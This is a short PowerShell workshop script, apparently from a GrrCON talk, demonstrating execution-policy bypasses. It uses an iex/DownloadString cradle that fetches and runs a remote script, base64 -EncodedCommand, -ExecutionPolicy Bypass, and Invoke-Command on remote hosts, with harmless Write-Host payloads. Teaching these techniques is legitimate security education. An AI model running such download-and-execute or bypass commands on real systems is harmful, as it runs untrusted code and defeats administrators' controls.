# Download a script from the internet
# This one probably won't work at GrrCON due to internet issues.
# The premise is that a string can be 
$uri = 'https://raw.githubusercontent.com/PSBlackOps/GrrCON-Workshop/master/Demos/ExecutionPolicy/RunMeIfYouCan.ps1'
powershell.exe -nop -command "iex(New-Object Net.WebClient).DownloadString('$uri')"

# Read the content of a file, then pipe it to PowerShell.exe's STDIN
Get-Content .\RunMeIfYouCan.ps1 | powershell.exe -nop -

# Run PowerShell.exe from CMD
# Open CMD prompt and CD to Documents\github\grrcon-workshop\demos\executionpolicy
# Verify the execution policy:
powershell.exe -nop -command "Get-ExecutionPolicy"
powershell.exe -nop -file .\RunMeIfYouCan.ps1

# Use the encodedcommand switch
$command = "Write-Host 'There is no right and wrong. Theres only fun and boring.'" 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand = [Convert]::ToBase64String($bytes) 
powershell.exe -nop -EncodedCommand $encodedCommand

# If you're an admin (or SYSTEM), you can just straight up bypass it
powershell.exe -nop -ExecutionPolicy Bypass -File .\RunMeIfYouCan.ps1

# Using Invoke-Expression - this can bypass execution policy on a remote system
# if remoting has been enabled. This method doesn't write to disk or change the
# system.
Invoke-Command  -scriptblock { Write-Host 'There is no right and wrong. Theres only fun and boring.' }